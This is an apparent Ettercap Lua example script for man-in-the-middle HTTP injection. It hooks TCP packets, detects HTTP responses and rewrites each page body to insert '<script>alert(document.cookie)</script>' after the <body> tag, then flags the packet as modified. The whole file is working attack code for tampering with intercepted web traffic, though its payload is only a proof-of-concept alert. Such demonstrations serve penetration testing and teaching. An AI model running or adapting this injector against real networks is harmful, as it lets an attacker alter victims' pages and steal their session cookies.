description = "This is a test script that will inject HTTP stuff";

-- Defines our hook point as being TCP
hook_point = Ettercap.ffi.C.HOOK_PACKET_TCP;

local bit = require('bit')

function split_http(str)
  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
  return start,finish,header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end

Ettercap.log("LUA: We are inside inject_http!\n")

-- Here's your match rule.
match_rule = function(po)
  Ettercap.log("inject_http match_rule : start\n")
  if (po.DATA.len <= 7) then
    Ettercap.log("inject_http match_rule : FALSE : not long enough\n")
    return false
  end

  Ettercap.log("inject_http match_rule : getting 7 byte buffer\n")
  local buf = Ettercap.ffi.string(po.DATA.data, 7)
  Ettercap.log("inject_http match_rule : checking buffer\n")
  local ret = (buf == "HTTP/1.")
  if (ret == true) then
    Ettercap.log("inject_http mtch_rule : TRUE\n")
    return true
  end
  Ettercap.log("inject_http mtch_rule : FALSE (not http)\n")
  return false

end

-- Here's your action.
action = function(po) 
  Ettercap.log("inject_http action : It's an HTTP response!!!!!!\n")
  -- Get the full buffer....
  local buf = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
    -- We've tweaked things, so let's update the data.
    if (not(modified_body == body)) then
      Ettercap.log("inject_http action : We modified the HTTP response!\n")
      local modified_data = header .. modified_body
      Ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
      local buf2 = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
      po.flags = bit.bor(po.flags,Ettercap.ffi.C.PO_MODIFIED)
    end
  end
end
